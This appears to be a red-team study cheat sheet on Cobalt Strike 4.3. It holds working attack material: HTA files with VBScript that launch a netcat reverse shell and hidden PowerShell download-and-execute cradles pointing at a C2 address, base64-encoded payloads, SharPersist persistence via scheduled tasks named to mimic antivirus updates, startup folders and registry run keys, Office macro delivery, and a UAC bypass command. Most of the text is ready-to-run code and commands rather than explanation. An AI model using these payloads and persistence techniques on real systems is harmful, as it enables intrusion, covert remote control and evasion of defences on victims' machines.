### How to start cobalt strike 4.3 ?
1. First start team server `./teamserver <KALI IP> <some password> <some C2 malleable profile>`
2. First start team server `./teamserver 192.168.10.200 password123 havex.profile`
3. Then `./start.sh`

### Useful commands for CS 4.3?
1. Change beacon time `sleep <digit number>`
2. E.g Change beacon time to 02 seconds `sleep 2`
3. Run commands via cmd.exe `shell <some command>`
4. E.g `shell dir` or `shell whoami`

### .hta file execution (requres Internet Explorer) 01 - Simple Hello World
```
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>
</html>
```
### .hta file execution (requres Internet Explorer) 02 - Get reverse shell "console" is hidden
```
<html>
  <head>
    <title>Reverse Shell</title>
  </head>
  <body>
    <h2>get reverse shell on 192.168.10.200 at port 00</h2>
    <p>This is a HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      Shell.Run "cmd /c C:\Users\jon\Desktop\crtoStuff\nc.exe -e cmd.exe 192.168.10.200 200", 0, True
    End Function

    Pwn
  </script>
</html>
```
### .hta file execution (requres Internet Explorer) 03 - Get poweshell reverse shell
1. In CS navigate to **Attacks > Web Drive-by > Scripted Web Delivery (S) and generate a 64-bit PowerShell payload for HTTP listener**. The URI path can be anything for e.g I had it **/tempOld**. 
2. By default if we use **powershell.exe** instead of giving the full path its not going to laucnh. This is because we have a **64bit** powershell payload but **.hta** uses **32 bit mstha.exe**. However, we can fix it by specifiying the fullpath with **sysnative**
```
<html>
  <head>
    <title>PS Shell</title>
  </head>
  <body>
    <h2>get shell PS</h2>
    <p>This is a HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.exec "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.10.200:80/tempOld'))"""
      ' This will fail -> shell.exec "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.10.200:80/tempOld'))"""
    End Function

    Pwn
  </script>
</html>
```
### .hta file execution (requres Internet Explorer) 04 - Get poweshell reverse shell after checking the desired architecture
```
<html>
  <head>
    <title>PS Shell</title>
  </head>
  <body>
    <h2>get shell PS</h2>
    <p>This is a HTA...</p>
  </body>
  
  <script language="VBScript">
    Function Pwn()
  Set shell = CreateObject("wscript.Shell")
  If shell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") = "AMD64" Then
    shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.10.200:80/tempOld'))"""
  Else
    shell.run "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.10.200:80/tempOld'))"""
  End If
    End Function
    Pwn
  </script>
</html>

```

### .macro for MS Word
1. Generate a macro for MS WORD **Attacks -> Packages -> MS Office Macro**
2. Copy & Paste the macro in the MS Word document (remeber to use **.doc** not the **.docx**
3. Disable Defender and Run it, you'll get the beacon 

### Persistence for MS Windows via SharPersist - Mehtod schtask
1. First generate the **x64 powershell** payload by **Attacks -> Web by Delivery -> Scripted Web Del (S)**
2. The above will generate a **PS payload, hosted on the CS TeamServer and will be run in memory**
3. E.g. it will be something like
```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.10.200:80/64bit'))"
```
3. To avoid issues, Base64 it as following:
```
Linux : echo -en 'IEX ((new-object net.webclient).downloadstring("http://192.168.10.200:80/64bit"))' | iconv -t UTF-16LE | base64 -w 0
PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('IEX ((new-object net.webclient).downloadstring("http://192.168.10.200:80/64bit"))'))
```
4. `SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMgAwADAAOgA4ADAALwA2ADQAYgBpAHQAIgApACkA" -n "AV-Definition-Update" -m add -o hourly`
5. `SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMgAwADAAOgA4ADAALwA2ADQAYgBpAHQAIgApACkA" -n "SysMonLog" -m add -o logon`

### Persistence for MS Windows via SharPersist - Mehtod startup folder
1. `execute-assembly SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMgAwADAAOgA4ADAALwA2ADQAYgBpAHQAIgApACkA" -f "UserEnvSetup" -m add`
2. If above command goes well, it create a file **UserEnvSetup** inside the path **C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup**

### Persistence for MS Windows via SharPersist - Mehtod registry autorun
1. Generate a revershell exe from CS e.g **artifactx64.exe**. 
2. Place this **artifactx64.exe** in that **C:\tools\malPayloads\artifactx64.exe** in Windows 10 OS. 
3. `execute-assembly SharPersist.exe -t reg -c "C:\tools\malPayloads\artifactx64.exe" -a "/q /n" -k "hkcurun" -v "someNameYouWant" -m add`

### Persistence for MS Windows via SharPersist - COM Hijacking DLL


### Windows Privilege Escalation - UAC Bypass
1. First run the SharpUp.exe via command `execute-assembly /opt/CRTO/SharpUp.exe audit`
2. If you see some error like **In medium integrity but user is a local administrator - UAC can be bypassed.** Then this attack **may** be successful. 
3. Also you can verify it by typing commands ``shell whoami /groups`` and ``shell whoami /priv``. You must be in **admin** group e.g. **BUILTIN\Administrators**
4. Two methods are provided by **CS** for this **UAC Bypass** i.e. **elevate** and **runasadmin**
5. in cobalt strike type: `elevate uac-token-duplication <your listner name>` e.g. ``elevate uac-token-duplication my1st64bit``
